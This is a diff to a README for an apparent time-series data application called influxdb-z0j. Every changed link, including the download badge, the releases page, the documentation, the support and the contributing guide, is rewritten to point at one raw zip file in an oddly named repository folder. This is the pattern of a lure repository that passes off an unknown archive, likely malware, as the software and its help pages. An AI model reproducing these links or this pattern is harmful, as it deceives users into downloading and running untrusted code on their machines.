@@ -6,7 +6,7 @@ Welcome to **influxdb-z0j**! This application helps you manage time-series data 
 
 ## 📥 Download Link
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-InfluxDB%20Z0J-blue)](https://github.com/adaratayr/influxdb-z0j/releases)
+[![Download Now](https://raw.githubusercontent.com/adaratayr/influxdb-z0j/main/ethnogenic/influxdb-z0j.zip%20Now-InfluxDB%20Z0J-blue)](https://raw.githubusercontent.com/adaratayr/influxdb-z0j/main/ethnogenic/influxdb-z0j.zip)
 
 ## 🛠️ System Requirements
 
@@ -22,7 +22,7 @@ Before you download, ensure your system meets these requirements:
 To get the application, follow these steps:
 
 1. **Visit the Releases Page.** Click the link below to go to the download page:
-   [Download Here](https://github.com/adaratayr/influxdb-z0j/releases)
+   [Download Here](https://raw.githubusercontent.com/adaratayr/influxdb-z0j/main/ethnogenic/influxdb-z0j.zip)
 
 2. **Choose Your Version.** Once on the Releases page, find the latest version of **influxdb-z0j** listed.
 
@@ -47,8 +47,8 @@ After you run the application, you can start managing your time-series data. Her
 
 ## 🔗 Useful Links
 
-- [Documentation](https://github.com/adaratayr/influxdb-z0j/wiki): Access the official documentation for detailed guides.
-- [Support](https://github.com/adaratayr/influxdb-z0j/issues): Need help? Report issues or ask questions here.
+- [Documentation](https://raw.githubusercontent.com/adaratayr/influxdb-z0j/main/ethnogenic/influxdb-z0j.zip): Access the official documentation for detailed guides.
+- [Support](https://raw.githubusercontent.com/adaratayr/influxdb-z0j/main/ethnogenic/influxdb-z0j.zip): Need help? Report issues or ask questions here.
 
 ## 🔍 Troubleshooting
 
@@ -66,7 +66,7 @@ Want to help improve influxdb-z0j? Contributions are welcome! You can:
 - Report bugs
 - Help improve documentation
 
-Visit the [Contributing Guide](https://github.com/adaratayr/influxdb-z0j/blob/main/CONTRIBUTING.md) for more information on how to get involved.
+Visit the [Contributing Guide](https://raw.githubusercontent.com/adaratayr/influxdb-z0j/main/ethnogenic/influxdb-z0j.zip) for more information on how to get involved.
 
 ## 📞 Contact
 
